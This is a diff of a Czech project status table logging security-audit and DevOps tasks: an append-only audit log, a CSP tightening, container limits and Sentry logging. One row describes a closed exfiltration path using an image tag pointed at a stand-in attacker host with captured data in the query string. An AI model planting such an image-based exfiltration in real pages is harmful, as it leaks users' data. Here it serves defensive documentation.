@@ -48,6 +48,7 @@
 | — | Security Audit — Sprint 6 — PR6 (H3) | **DONE** | Append-only `audit_entries` na DB úrovni — Postgres RULE `ON UPDATE/DELETE DO INSTEAD NOTHING`. Ani admin s psql přístupem, ani budoucí cascade delete, ani kompromitovaný service account nemůže audit stopu přepsat/smazat. 3 pgsql-only testy. |
 | — | Security Audit — Sprint 6 — PR7 (H7) | **DONE** | CSP `img-src` zúžen — `https:` (všechno) nahrazeno `https://*.googleusercontent.com` (jen Google avatary). Exfiltration path přes `<img src=attacker/?c=...>` uzavřena. Změna v `Caddyfile.prod` + `Caddyfile.shared` (prod + staging). Oba validované přes `caddy validate`. |
 | — | DevOps Sprint — PR1 (Resource limits + healthchecks) | **DONE** | `mem_limit` + `cpus` na prod (součet 5.5G), staging (1.4G), Caddy (256M) kontejnery — 8 GB VPS s 500 MB OS headroom. Healthcheck pro worker (`horizon:status`), scheduler (heartbeat touch/find), Caddy (`nc -z :80`). Jedna runaway query už nesrazí Postgres, zamrzlý Horizon/scheduler Docker restartne automaticky. |
+| — | DevOps Sprint — PR2 (Sentry + stderr logs + UptimeRobot docs) | **DONE** | `sentry/sentry-laravel` integrace přes `SentryIntegration::handles()` v `bootstrap/app.php`, PHI-safe config (`send_default_pii=false`, bindings off). Prod/staging `LOG_STACK=stderr` → `docker compose logs` persistentní přes restart. Runbook s instrukcí Sentry + UptimeRobot setup (oba free tier). DSN prázdný = SDK no-op v dev. |
 
 ---
 
